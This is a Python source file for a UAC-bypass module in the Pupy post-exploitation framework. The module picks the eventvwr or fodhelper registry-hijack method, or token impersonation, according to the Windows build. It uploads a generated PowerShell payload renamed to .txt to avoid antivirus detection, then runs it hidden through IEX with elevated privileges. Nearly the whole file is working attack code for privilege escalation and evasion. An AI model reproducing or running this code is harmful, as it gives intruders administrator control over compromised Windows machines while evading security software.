# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
import pupygen
import random
import string

__class_name__="BypassUAC"

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):
    
    """try to bypass UAC """
    
    dependencies=['pupwinutils.bypassuac_token_imp','pupwinutils.bypassuac_registry', 'pupwinutils.security']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "fodhelper", "tokenimp", ], default=None, help="By default, a method will be found for you depending on your build version")
        self.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
        self.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")

    def run(self, args):

        method = args.method
        if not method: 
            windows_info = self.client.conn.modules["pupwinutils.security"].get_windows_version()
            if windows_info:
                # check if your host is previous Vista
                if float(str('%s.%s' % (windows_info['major_version'], windows_info['minor_version']))) < 6.0:
                    self.success('You are lucky, this Windows version does not implement UAC.')
                    return
                
                # Windows 10
                if windows_info['build_number'] >= 10240:
                    method = 'fodhelper'
                
                # Windows 7, 8 and some Win10 build
                elif windows_info['build_number'] >= 7600:
                    method = 'eventvwr'

                else:
                    method = 'tokenimp'
            elif not windows_info:
                self.error('No bypassuac method has been found automatically, you should do it manually using the "-m" option')
                return 

        # check if a UAC bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        # ------------------ Prepare the payload ------------------

        ros         = self.client.conn.modules['os']
        rtempfile   = self.client.conn.modules['tempfile']
        tempdir     = rtempfile.gettempdir()
        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
        local_file  = ''
        remotefile  = ''

        # use powershell
        if not args.exe and not args.restart:
            self.info('Using powershell payload')
            if '64' in  self.client.desc['proc_arch']:
                local_file = pupygen.generate_ps1(self.client.get_conf(), x64=True)
            else:
                local_file = pupygen.generate_ps1(self.client.get_conf(), x86=True)

            # change the ps1 to txt file to avoid AV detection
            random_name += '.txt'
            remotefile  = ros.path.join(tempdir, random_name)

            cmd     = u'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
            param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile

        # use a custom exe to execute as admin
        elif args.exe:
            self.info('Using custom executable')
            if os.path.exists(args.exe):
                local_file  = args.exe

                random_name += '.exe'
                remotefile  = ros.path.join(tempdir, random_name)
                
                cmd     = remotefile
                param   = u'' 

            else:
                self.error('Executable file not found: %s' % args.exe)
                return

        # restart the current executable as admin
        else:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd     = self.client.desc['exec_path']
            param   = u'' 

        # upload payload (ps1 or custom exe)
        if not args.restart:
            self.info("Uploading to %s" % remotefile)
            upload(self.client.conn, local_file, remotefile)

        # ------------------ Ready to launch the bypassuac ------------------

        self.success("Trying to bypass UAC using the '%s' method" % method)

        # Works from: Windows 7 (7600)
        # Fixed in: Windows 10 RS2 (15031) 
        if method == "eventvwr":
           self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_eventvwr(cmd, param)

        # Works from: Windows 10 TH1 (10240)
        # Unfixed
        elif method == "fodhelper":
            self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_fodhelper(cmd, param)

        # Works from: Windows 7 (7600)
        # Unfixed
        elif method == "tokenimp":
            param = param.replace('-w hidden ', '')
            self.client.conn.modules["pupwinutils.bypassuac_token_imp"].run_bypass_uac_using_token_impersonation(cmd, param)
        
        self.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")

        # TO DO (remove ps1 file)
        # ros.remove(remotefile) # not work if removed too fast

        # remove generated ps1 file
        if not args.exe and not args.restart:
            os.remove(local_file)
